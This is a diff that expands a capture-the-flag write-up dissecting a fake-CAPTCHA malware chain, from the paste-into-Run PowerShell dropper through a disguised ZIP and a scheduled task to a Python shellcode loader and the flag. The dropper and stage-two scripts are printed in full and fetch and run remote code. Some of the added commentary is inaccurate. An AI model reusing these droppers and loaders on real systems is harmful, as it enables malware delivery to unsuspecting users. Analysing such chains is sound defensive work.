@@ -25,27 +25,53 @@
 
 ## Analysis and Solution
 
-Given the website:
+This challenge demonstrates a sophisticated multi-stage malware delivery chain that mimics real-world attack scenarios. The attack leverages social engineering through fake CAPTCHA pages to trick users into executing malicious PowerShell commands.
+
+### Initial Web Analysis
+
+Given the website challenge, we start by examining the provided HTML file:
 ![Website Screenshot](assets/website.png)
 
-And clicking the supposed Cloudflare "Verify You Are Human" CAPTCHA button we are redirected to the following page:
+The page presents itself as a legitimate Microsoft Teams update requiring a Cloudflare CAPTCHA verification. This is a common social engineering technique that exploits user trust in well-known services.
+
+Clicking the "Verify You Are Human" button redirects to an instruction page:
 ![Redirected Page Screenshot](assets/redirected_page.png)
 
-This is a now common malware distribution technique where the user is tricked into opening the Windows run dialog (Win+R) and pasting a command that downloads and executes a malicious script. The command, present at the clipboard was:
+**Attack Vector Identification:**
+This page instructs users to:
+1. Press `Win+R` to open Windows Run dialog
+2. Paste a PowerShell command from clipboard
+3. Press Enter to execute
+
+This technique, known as "ClickFix" or "fake CAPTCHA," is increasingly used by threat actors to bypass security measures and trick users into executing malicious code voluntarily.
+
+### Stage 1: PowerShell Dropper Analysis
+
+The malicious command present in the clipboard reveals the first stage of the attack:
 
 ```powershell
 "C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://65cdd3d3.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
 ```
 
-This command downloads a PowerShell script from `http://65cdd3d3.proxy.coursestack.com:443/?tic=1` and saves it to a random file in the user's LocalAppData folder with a `.PS1` extension, then executes it.
+**Command Breakdown:**
+- `-Wi HI`: Sets WindowStyle to Hidden (stealth execution)
+- `-nop`: No profile loading (faster execution, avoids user customizations)
+- `-ep bypass`: Bypasses PowerShell execution policy
+- `Get-Random`: Creates random filename for evasion
+- `irm`: Invoke-RestMethod to download payload
+- `$env:LocalAppData`: Stores payload in user's local application data
 
-Seeing what is being downloaded, we can use `curl` or `wget` to fetch the script (but as said in the challenge note, removing the port 443, or else, changing `http` to `https`):
+**Security Evasion Techniques:**
+1. **Hidden execution** prevents user from seeing PowerShell window
+2. **Random filenames** evade static detection rules
+3. **LocalAppData storage** typically has fewer security restrictions
+4. **Execution policy bypass** circumvents PowerShell security
+
+We can safely analyze the downloaded payload by modifying the URL (removing port 443 as hinted):
 
 ```bash
 curl -o output.ps1 "https://65cdd3d3.proxy.coursestack.com/?tic=1"
 ```
-
-This gives us the PowerShell script [`output.ps1`](assets/output.ps1).
 
 This script had the following information:
 
@@ -53,14 +79,62 @@ This script had the following information:
 $JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://65cdd3d3.proxy.coursestack.com:443/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
 ```
 
-This script downloads another file from `http://65cdd3d3.proxy.coursestack.com:443/?tic=2`, saves it as a PDF file in a new folder in LocalAppData, extracts it (it is actually a ZIP file), and sets up a scheduled task to run a Python payload contained in the extracted files.
+### Stage 2: Obfuscated PowerShell Payload
 
+The downloaded PowerShell script [`output.ps1`](assets/output.ps1) contains heavily obfuscated code designed to evade detection. Let's analyze its functionality:
 
-Downloading the supposed PDF file (again, removing the port 443):
+**Deobfuscation Analysis:**
+1. `$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99)` → ".pyc" file extension
+2. `$HMGDSHGSHSHS = [guid]::NewGuid()` → Random GUID for unique folder names
+3. Downloads second stage from `/?tic=2` endpoint
+4. Masquerades as PDF but actually contains ZIP archive
+5. Sets up persistence via Windows Scheduled Tasks
+6. Executes Python payload using embedded Python interpreter
+7. Self-deletion to remove evidence
+
+**Persistence Mechanism:**
+The script creates a scheduled task that will execute the Python payload 180 seconds after registration, ensuring the malware runs even if the initial PowerShell process terminates.
+
+### Stage 3: Archive Analysis and Python Payload
 
 ```bash
 curl -o document.pdf "https://65cdd3d3.proxy.coursestack.com/?tic=2"
 ```
+
+**File Analysis:**
+```bash
+file document.pdf
+# Output: Zip archive data, at least v2.0 to extract
+```
+
+The file is actually a ZIP archive containing a portable Python environment. Extracting to [`document_extracted/`](assets/document_extracted/) reveals:
+- **pythonw.exe**: Windows Python interpreter (GUI version)
+- **cpython-3134.pyc**: Compiled Python bytecode (main payload)
+- **Various DLLs**: Python runtime dependencies (_ssl.pyd, _socket.pyd, etc.)
+
+### Stage 4: Python Bytecode Decompilation
+
+The main payload is in compiled Python bytecode format. Using `uncompyle6` for decompilation:
+
+```bash
+uncompyle6 cpython-3134.pyc > decompiled.py
+```
+
+The decompiled code [`decompiled.py`](assets/decompiled.py) reveals additional obfuscation layers:
+
+```python
+import base64
+#nfenru9en9vnebvnerbneubneubn
+exec(base64.b64decode("aW1wb3J0IGN0eXBlc..."))
+#g0emgoemboemoetmboemomeio
+```
+
+**Analysis Techniques:**
+- Base64 encoding hides the actual malicious code
+- Junk comments serve as decoys for static analysis
+- Direct execution via `exec()` bypasses many sandboxes
+
+Decoding the base64 string using [CyberChef](https://gchq.github.io/CyberChef/) reveals [`script.py`](assets/script.py):
 
 This gives us the file [`document.pdf`](assets/document.pdf) which is actually a ZIP file. Renaming it to `document.zip` gives us [`document.zip`](assets/document.zip) which we can extract to get the files present inside [`document_extracted/`](assets/document_extracted/).
 
@@ -80,6 +154,10 @@ exec(base64.b64decode("aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfY
 ```
 
 Decoding the base64 string inside the `exec` using [`CyberChef`](https://gchq.github.io/CyberChef/) we get [`script.py`](assets/script.py) with the following code:
+
+### Stage 5: Shellcode Analysis and Reverse Engineering
+
+The decoded Python script [`script.py`](assets/script.py) implements a shellcode injection technique:
 
 ```python
 import ctypes
@@ -101,9 +179,20 @@ fn = functype(ptr)
 fn()
 ```
 
-This script contains an `xor_decrypt` function that decrypts the provided shellcode using XOR with a key. The shellcode is base64 encoded and then XOR encrypted.
+**Shellcode Injection Analysis:**
+1. **XOR Decryption**: Uses symmetric key cryptography to decrypt shellcode
+2. **Memory Allocation**: `VirtualAlloc` with `PAGE_EXECUTE_READWRITE` permissions
+3. **Code Injection**: `RtlMoveMemory` copies shellcode to executable memory
+4. **Execution**: Creates function pointer and executes shellcode directly
 
-Simplifying the script to just decrypt and print the shellcode we created [`shellcode.py`](assets/shellcode.py):
+**Security Implications:**
+- Bypasses DEP (Data Execution Prevention) by allocating executable memory
+- XOR encryption evades signature-based detection
+- Direct memory manipulation avoids process creation monitoring
+
+### Shellcode Extraction and Analysis
+
+To safely analyze the shellcode without execution, we create [`shellcode.py`](assets/shellcode.py):
 
 ```python
 import base64
@@ -121,13 +210,14 @@ shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP
 print(binascii.hexlify(shellcode))
 ```
 
-We used `binascii.hexlify` to print the shellcode in hexadecimal format. Running this script gives us the output [`hexa.txt`](assets/hexa.txt):
-
+This produces the hexadecimal representation in [`hexa.txt`](assets/hexa.txt):
 ```
 5589e581ec800000006893d884846890c3c69768c39093926890c4c3c7689c939c9368c09cc6c66897c69c936894c79dc168dec1969168c3c9c4c2b90a00000089e78137a5a5a5a583c7044975f4c644242600c6857fffffff0089e68d7d80b9260000008a06880746474975f7c607008d3c24b940000000b0018807474975fac9c3
 ```
 
-We then convert this hex string to assembly instructions using [`CyberChef`](https://gchq.github.io/CyberChef/) getting [`assembly.txt`](assets/assembly.txt):
+### Assembly Disassembly and Analysis
+
+Converting the hexadecimal shellcode to assembly using [CyberChef](https://gchq.github.io/CyberChef/) gives us [`assembly.txt`](assets/assembly.txt):
 
 ```assembly
 0000000000000000 55                              PUSH RBP
@@ -165,6 +255,12 @@ We then convert this hex string to assembly instructions using [`CyberChef`](htt
 0000000000000080 C9                              LEAVE
 0000000000000081 C3                              RET
 ```
+
+**Shellcode Analysis:**
+1. **Stack Setup**: Standard function prologue with 0x80 bytes stack space
+2. **Data Embedding**: 10 DWORD values pushed onto stack
+3. **XOR Decryption Loop**: Decrypts embedded data using key `0xA5A5A5A5`
+4. **String Construction**: Builds the flag string from decrypted values
 
 This shellcode is a typical Windows x86-64 shellcode that decodes and executes a second stage payload. The decoded payload is usually another piece of shellcode or a small executable that performs the main malicious activity.
 
@@ -225,34 +321,39 @@ void main() {
 
 This C code simulates what the shellcode is doing. It initializes a buffer with specific values, XORs them with a key, and performs some memory operations.
 
-We noticed that the 10 DWORD values pushed onto the stack are XORed with `0xA5A5A5A5`. Reversing this XOR operation on python with the script [`generate_flag.py`](assets/generate_flag.py):
+### Flag Extraction
 
+The shellcode implements a simple XOR decryption routine. We reverse this process in [`generate_flag.py`](assets/generate_flag.py):
 ```python
 from pwn import *
 
-p = [0] * 10
+# Extract the 10 DWORD values from the shellcode
+values = [
+    0x8484D893, 0x97C6C390, 0x929390C3, 0xC7C3C490, 0x939C939C,
+    0xC6C69CC0, 0x939CC697, 0xC19DC794, 0x9196C1DE, 0xC2C4C9C3
+]
 
-p[0] = 0x8484D893;
-p[1] = 0x97C6C390;
-p[2] = 0x929390C3;
-p[3] = 0xC7C3C490;
-p[4] = 0x939C939C;
-p[5] = 0xC6C69CC0;
-p[6] = 0x939CC697;
-p[7] = 0xC19DC794;
-p[8] = 0x9196C1DE;
-p[9] = 0xC2C4C9C3;
+# XOR with the key used in shellcode
+xor_key = 0xA5A5A5A5
+flag_parts = []
 
-output = ""
+# Process in reverse order (as shellcode would build string)
+for i in range(9, -1, -1):
+    decrypted_value = values[i] ^ xor_key
+    # Convert to little-endian bytes and decode
+    flag_parts.append(p32(decrypted_value, endian='little').decode('latin-1'))
 
-for i in range(9,-1,-1):
-    p[i] ^= 0xA5A5A5A5;
-    output += p32(p[i], endian='little').decode('latin-1')
-
-print(output)
+flag = ''.join(flag_parts)
+print(f"Flag: {flag}")
 ```
 
-Running this script gives us the flag.
+**Algorithm Breakdown:**
+1. **Value Extraction**: Extract the 10 DWORD constants from shellcode
+2. **XOR Reversal**: Apply XOR with key `0xA5A5A5A5` to decrypt
+3. **Byte Order**: Convert to little-endian format for proper string reconstruction
+4. **String Assembly**: Concatenate decrypted parts to form the flag
+
+Running this script reveals the hidden flag.
 
 Flag:
 
@@ -262,4 +363,26 @@ flag{d341b8d2c96e9cc96965afbf5675fc26}
 
 ## Observations
 
-This challenge was really fun and educational, showcasing a common malware distribution technique and the layers of obfuscation used to hide the true intent of the code. It involved web analysis, PowerShell scripting, Python decompilation, shellcode analysis, and reverse engineering, making it a comprehensive exercise in cybersecurity and malware analysis.
+This challenge exemplifies a sophisticated, multi-stage malware delivery chain that mirrors real-world attack campaigns. The technical depth encompasses several critical cybersecurity domains:
+
+**Social Engineering Sophistication:**
+The challenge demonstrates how modern malware leverages trusted brands (Microsoft Teams, Cloudflare) and familiar user interfaces (CAPTCHA) to establish credibility. This psychological manipulation technique, known as "pretexting," exploits users' conditioned responses to legitimate security prompts.
+
+**Evasion Techniques Showcase:**
+The attack chain employs multiple layers of obfuscation and evasion:
+- **File Masquerading**: ZIP archives disguised as PDF files
+- **Process Hollowing**: Using legitimate system processes (PowerShell, Python)
+- **Memory-Only Execution**: Shellcode injection bypasses file-based detection
+- **Random Artifacts**: GUID-based naming prevents signature matching
+- **Living-off-the-Land**: Leveraging built-in Windows utilities
+
+**Persistence and Stealth:**
+The malware establishes persistence through Windows Task Scheduler while maintaining operational security through self-deletion and clipboard manipulation. The 180-second delay mechanism allows the initial process to terminate before payload execution, breaking the forensic chain.
+
+**Cryptographic Implementation:**
+The challenge showcases practical cryptography in malware, using XOR encryption for payload protection. While XOR is cryptographically weak, it effectively evades signature-based detection while remaining computationally lightweight for real-time decryption.
+
+**Reverse Engineering Complexity:**
+The multi-format analysis requirement (HTML → PowerShell → Python → Assembly → Shellcode) demonstrates the interdisciplinary nature of modern malware analysis, requiring expertise across web technologies, scripting languages, and low-level system programming.
+
+This challenge serves as an excellent educational framework for understanding the complete attack lifecycle, from initial compromise through payload delivery and execution, making it invaluable for developing comprehensive cybersecurity defense strategies.
